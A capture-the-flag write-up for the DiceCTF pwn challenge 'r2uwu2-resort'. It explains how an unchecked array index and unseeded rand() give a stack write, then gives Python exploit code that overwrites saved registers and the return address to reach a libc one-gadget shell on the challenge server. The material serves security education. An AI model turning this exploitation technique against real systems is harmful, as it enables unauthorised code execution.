# Dice CTF
## r2uwu2-resort (pwn)
### hint
```
I heard that r2uwu2 just won an all-expenses paid trip to a ✨ Celestial Resort ✨ on the slopes of Canada! But this trip might not be
all that it's cracked up to be - there's dust bunnies abound and garbage is cycling everywhere...
  - arcblroth
```
The most solved pwn challenge but fairly involved. We are given a binary, a Dockerfile, and a source file. The binary has the usual checksec mitigations enabled: Full RELRO, Canaries, NX bit, and PIE.
### context
The binary is an RPG game where 3 dust bunnies attack you. You need to kill them with various weapons before your HP drops below 0. If all three of them die, it exits with 0. There are 4 items we can attack with. Items 0-2 do a random amount of damage from 0-255 to the selected enemy and item 3 sets the selected enemy's health to 0.

Even with this basic behavior, there are some issues: First, our HP can never drop below 0 as it is a `uint8_t`. Second, we have an MP bar, but it does nothing. This means that we can attack as many times as we want until all bunnies die.

The next issue is with the damage dealt: A bunnies HP is an `int_8`, and when we attack we can do 255 damage. This is equivalent to subtracting by one and won't kill the bunny. This ended up not mattering, but it could have if we wanted to set RAX to 0 for the one gadget to work.

More importantly to the exploit, the menu screen gives us a leak of the pointer to the function `print_ui`. This means we know the location of the `text` section for the binary:
```c
  printf("%-23p", &print_ui);
```

### vulnerability
When we input the choice, the following code is ran:
```c
printf("Attack with [%s] against which bunny? (1-3) > ", items[item]);
fflush(stdout);
if (scanf("%d%*[^\n]", &choice) == 0) {
    puts("bad input >:(");
    fflush(stdout);
    return 1;
}
```
Notably, there is no bounds checking. This means that when the attack code is ran, we can get an out-of-bounds write:
```c
uint8_t dmg;
if (item == 3) {
    bunnies[choice - 1].hp = 0;
} else {
    dmg = rand() % 255;
    bunnies[choice - 1].hp -= dmg;
}
```
So we have two ways of using this out-of-bounds write depending on the item chosen. If `item == 3`, we set the memory at `bunnies + choice - 1` to 0. If `item < 3`, we subtract a random number between 0 and 254 from the memory at `bunnies + choice - 1`.

Clearly, if we know the random value, this becomes an arbitrary write on the stack as we can 0 the index on the stack we want to overwrite, and then find a random value that equals the negation of the value we want to right. So if we want to write 0xFF at `bunnies + 120`, we choose to attack index 120 when item = 3 and then look for a random value that equals 0x1 afterwards. With this alone we would be able to do a full ROP chain using the given binary.  

Luckily, the challenge never seeds the rand function. To be completely safe, I generated all the random values from the docker image with this C code:
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("20000 random values\n");
    for (int i = 0; i < 20000; i++) {
        printf("%u\n", rand());
    }
}
```
We expect to get every value we would need a few times over with this, so it should be good enough for us. I then wrote some python code to simulate the rand calls that resort.c makes:
```py
import rand_vals as rv
dmgs = [] # The damage we will do when taking action[i]

i = 0 # The number of random values we have generated
taken = 0 # The number of actions we have taken
while taken < 5000:
    taken += 1 # We are taking another action
    
    item = rv.vals[i] % 4 # Generate an item and increase our rand call count
    i += 1

    if item != 3:
        dmg = rv.vals[i] # Generate another random value representing damage done, increase number of rand calls
        i += 1
        dmgs.append(dmg % 255)
    else:
        dmgs.append(-1) # If the item is 3, put a special value to mark it as such

print(dmgs)
```
(rand_vals is a python file with `vals = [<insert random values generated above here>]` in it. Note that you could use ctypes here and it would work just as well.)

## exploit

We can now do ROP gadgets, and ROP gadgets are good, but to use them we would need a LibC leak as we don't have a `syscall` gadget. But we can do more with this information: on the stack we find `__libc_start_call_main + 128` is the return address. We don't have an easy way to leak it, but what we do have is a way to subtract from its bytes. After downloading the libc from the Docker image (and grabbing the wrong one, setting me back an hour or two) we find the following one gadget:
```c
0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
```
If we look at the disassembly of resort's main function, the postlude looks like this:
```asm
pop    rbx
pop    r12
pop    r13
pop    r14
pop    r15
pop    rbp
ret
```
Because of the earlier stack write primitive, we know that we control all 3: `rbp`, `r13`, and `r12`, and it is especially easy to set them to 0. `rbp-0x48` needs to be writeable, but luckily we know where the data section is from the `print_ui` leak and can set rbp to be somewhere in the data section plus 0x48 to satisfy the constraint. This means that if we can add `0xebce2 - (libc.symbols["__libc_start_call_main"] + 128)` from the return address, we can get a one gadget, which is much cleaner than a messy ROP chain.  

So then, we need to be able to subtract two numbers. But we can only subtract bytes! Luckily probability is on our side. This is going to be a little bit of a detour to explain it because its a little confusing.

### subtracting byte-by-byte
Lets say `libc.symbols["__libc_start_call_main"] + 128` had the offset `0x304050` and we wanted to set it to a one gadget at `0x405060`. Without ASLR, this is simple because we can subtract `0xF0` (as `-0xF0 = 0x10 % 0x100`) from each byte and we have our correct offset. Lets say we have `LIBC_OFFSET = 0x10101010`. Then it is similarly easy, as `0x304050 + LIBC_OFFSET = 0x10405060` and `0x405060 + LIBC_OFFSET = 0x10506070`. As you can see, we still only need to add `0x10` to each byte to get the address to be correct! However, lets say we get unlucky, and `LIBC_OFFSET = 0xA0A0A0`. Then `0x304050 + LIBC_OFFSET = 0xC0D0E0`, but `0x405060 + LIBC_OFFSET = 0xD0E100`! Now we need to add `0xE0` to the first byte and `0x11` to the second byte. This only happens if there is an index in an offset such that `offset[i] + LIBC_OFFSET[i] >= 0x100`, or put another way, we want to avoid carries between bytes. This still gives us good odds enough odds to get the offset that we want if we just blindly subtract as though the ASLR does not cause a carry, as long as each byte in the ASLR is small enough.

So we have our exploit: Replace RBP, R12, and R13 with the desired values, and subtract `(libc.symbols["__libc_start_call_main"] + 128) - 0xebce2` byte-wise from the return address, and then exit the program.

## implementing the exploit
The implementation can be broken down into a few functions: `set_byte`, `sub_byte`, and `run`. I also use a method `kill_bunnies` (` :( `) but its not necessary for this exploit (it was used for an earlier version with the wrong libc version, where the one gadget required `rax = 0` to work, so we needed a successful exit). The basic outline of the implementation is as follows:
- `actions` represents what number the program will send at the ith prompt. So if `actions[10] = 2`, then we will attack the second bunny after being prompted for the 11th time. 
- `dmgs` is an array representing what damage we deal for a given action, so if `dmgs[10] = 0x30`, we will deal 48 damage to the second bunny after being prompted for the 11th time.
- `latest` represents the last action we have decided to take. When we reach this action, we want to change to interactive mode to cat the flag.
- We need to convert from `rsp` offset to `bunnies` offset. The `bunnies` array starts at `rsp + 12` and the selected bunny is subtracted by one, so we want `offset = stack_offset - 11` to get our desired position.

Then we have the actual implementations:
- `sub_byte(addr_offset, val)`: Search through `dmgs` until we find one equivalent to `dmg = val` that has not been selected for an action yet. Set the action to take to be `offset = addr_offset - 11`
```py
def sub_byte(addr_offset, val):
    global actions, dmgs, latest
    offset = addr_offset - 11
    for i, dmg in enumerate(dmgs):
        # print(dmg)
        if dmg == val and isnothing(i):
            actions[i] = offset
            print("Action", i, "caused",  dmg, "damage")
            if i+1 > latest:
                latest = i+1
            return
    print("No action found")
```
- `set_byte(addr_offset, val)`: Search through dmgs until we find an unused -1 (which sets its offset to 0). Set the action to the calculated offset. Then continue until we find another `dmg = (-val & 0xFF)`. Again set the action to the calculated offset
```py
def set_byte(addr_offset, val):
    global actions, dmgs, latest
    offset = addr_offset - 11
    found_zero = False
    for i, dmg in enumerate(dmgs):
        # print(dmg)
        if not found_zero and dmg == -1 and isnothing(i):
            actions[i] = offset
            print("Action", i, "zeroed", addr_offset)
            if i+1 > latest:
                latest = i+1
            found_zero = True
                
        if found_zero and dmg == (-val) & 0xFF and isnothing(i):
            actions[i] = offset
            print("Action", i, "caused", dmg, "damage")
            if i+1 > latest:
                latest = i+1
            return
    print("No action found")
```
- `set_long(addr_offset, bval, n=6)`: Run `set_byte(addr_offset+i, bval[i])` for i in 0..n. The reason we set n = 6 is because addresses tend to have 0 at the highest 2 bytes anyway.
```py
def set_long(addr_offset, bval, n=6):
    global actions, dmgs, latest
    for i in range(n):
        set_byte(addr_offset+i, bval[i])
```
- `run()`: Go through the actions array, sending each value to the remote until we are past latest or the program asks to be ended.
```py
def run(r):
    global actions, latest
    for i, a in enumerate(actions[:latest]):
        if a == DIE:
            r.sendline(b'a')
            break
        if a != NOTHING:
            print("Action", i, "=", a)

        r.sendline(str(a).encode())
    r.interactive()
```
With these helper functions, we can finally run our exploit:
```py
r = remote("dicec.tf", 32030)

# Get a leak of main to find the data address
first_resp = r.recvuntil(b' > ')
leak = get_hex(first_resp)[-1]

chal.address = leak - chal.symbols["print_ui"]

onegadget = 0xebce2;
retaddr = libc.symbols["__libc_start_call_main"] + 128

bonegadget = p64(onegadget)
bretaddr = p64(retaddr)

# Figure out what we need to subtract bitwise for the relative write
sub1 = (bretaddr[0] - bonegadget[0]) & 0xFF
sub2 = (bretaddr[1] - bonegadget[1]) & 0xFF
sub3 = (bretaddr[2] - bonegadget[2]) & 0xFF

bmain = p64(chal.symbols["main"])

set_long(80, p64(0)) # set r12 to 0
set_long(88, p64(0)) # set r13 to 0
set_long(112, p64(chal.symbols["items"] + 0x48)) # set rbp to some .data variable + 0x48

# Offset the return address to one gadget
sub_byte(120, sub1)
sub_byte(121, sub2)
sub_byte(122, sub3)

kill_bunnies()
run(r)
```
And with this, we get a shell and can run `cat flag.txt`

The final script can be found as a [gist on my github](https://gist.github.com/pawnlord/b84f3b89d6942c1d83ee6150adce69f8) (along with the [random values](https://gist.github.com/pawnlord/422780d02b414daa98fcbcad10443c6c), for completeness)